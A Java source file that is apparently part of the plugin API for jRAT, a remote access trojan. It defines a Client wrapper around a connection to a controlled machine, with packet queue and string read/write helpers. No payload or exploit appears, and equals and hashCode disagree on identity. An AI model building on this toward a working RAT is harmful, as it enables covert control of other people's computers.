package jrat.api;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.net.Connection;
import jrat.api.net.PacketBuilder;
import jrat.api.net.Queue;
import jrat.api.net.Reader;
import jrat.api.net.Writer;

public final class Client {

	private final int id;
	private final String ip;
	private final Connection con;
	private final Writer writer;
	private final Reader reader;
	private final Queue queue;
	private final DataInputStream in;
	private final DataOutputStream out;

	public Client(int id, String ip, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
		this.id = id;
		this.ip = ip;
		this.con = con;
		this.writer = writer;
		this.reader = reader;
		this.queue = queue;
		this.in = in;
		this.out = out;
	}

	/**
	 * 
	 * @return IP of server in format "IP / PORT"
	 */
	public String getIP() {
		return ip;
	}

	/**
	 * 
	 * @return The connection class with connection information about this
	 *         server
	 */
	public Connection getConnection() {
		return con;
	}

	/**
	 * 
	 * @return Writer
	 */
	public Writer getDataWriter() {
		return writer;
	}

	/**
	 * 
	 * @return Reader
	 */
	public Reader getDataReader() {
		return reader;
	}

	/**
	 * Adds packet to send queue and falls back to controller
	 * 
	 * @param packet
	 */
	public void addToSendQueue(PacketBuilder packet) throws Exception {
		queue.addToSendQueue(packet, this);
	}

	/**
	 * Only equals if IP, id, or instance is
	 */
	@Override
	public boolean equals(Object obj) {
		if (obj instanceof Client) {
			return this == obj || ((Client) obj).id == this.id;
		}

		return false;
	}
	
	@Override
	public int hashCode() {
		return ip.hashCode();
	}

	/**
	 * Use addToSendQueue directly
	 * 
	 * @return The packet queue
	 */
	@Deprecated
	public Queue getQueue() {
		return queue;
	}

	public DataInputStream getDataInputStream() {
		return in;
	}

	public DataOutputStream getDataOutputStream() {
		return out;
	}
	
	public String readString() throws Exception {
		String s = "";
		
		short len = in.readShort();
		
		for (int i = 0; i < len; i++) {
			s += in.readChar();
		}
		
		return s;
	}
	
	public void writeString(String s) throws Exception {
		out.writeShort(s.length());
		out.writeChars(s);
	}
}
